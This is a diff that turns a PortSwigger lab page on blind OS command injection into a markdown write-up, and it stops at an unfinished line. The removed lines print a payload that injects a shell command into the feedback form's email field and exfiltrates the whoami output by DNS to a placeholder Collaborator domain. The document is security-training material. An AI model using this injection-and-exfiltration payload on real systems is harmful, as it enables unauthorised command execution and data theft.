@@ -1,25 +1,49 @@
-Lab: Blind OS command injection with out-of-band data exfiltration
-PRACTITIONER
+# Blind OS command injection with out-of-band data exfiltration
 
-LAB
-Not solved
+## PortSwigger Web Security Academy
+
+Difficulty:
+
+Practitioner
+
+Status:
+
+Solved
+
+
+## Lab Description
+
 This lab contains a blind OS command injection vulnerability in the feedback function.
 
-The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.
+The application executes a shell command containing user-controlled input.
 
-To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.
+However:
 
-Note
-To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.
+- The command runs asynchronously
+- The output is not returned in the HTTP response
+- Output redirection is not possible
+- No direct communication channel exists between the server and attacker
 
-ACCESS THE LAB
- Solution
-Use Burp Suite Professional to intercept and modify the request that submits feedback.
-Go to the Collaborator tab.
-Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
-Modify the email parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated:
+The vulnerability is exploited using an out-of-band technique to exfiltrate command output through DNS queries.
 
-email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
-Go back to the Collaborator tab, and click "Poll now". You should see some DNS interactions that were initiated by the application as the result of your payload. If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
-Observe that the output from your command appears in the subdomain of the interaction, and you can view this within the Collaborator tab. The full domain name that was looked up is shown in the Description tab for the interaction.
-To complete the lab, enter the name of the current user.
+
+## Vulnerability Type
+
+Blind OS Command Injection
+
+Technique:
+
+Out-of-Band Data Exfiltration
+
+
+This technique extends standard OOB exploitation by not only proving command execution, but also extracting command output.
+
+
+## Vulnerable Functionality
+
+Feature tested:
+
+Feedback submission form
+
+
+The vulnerable parameter was:
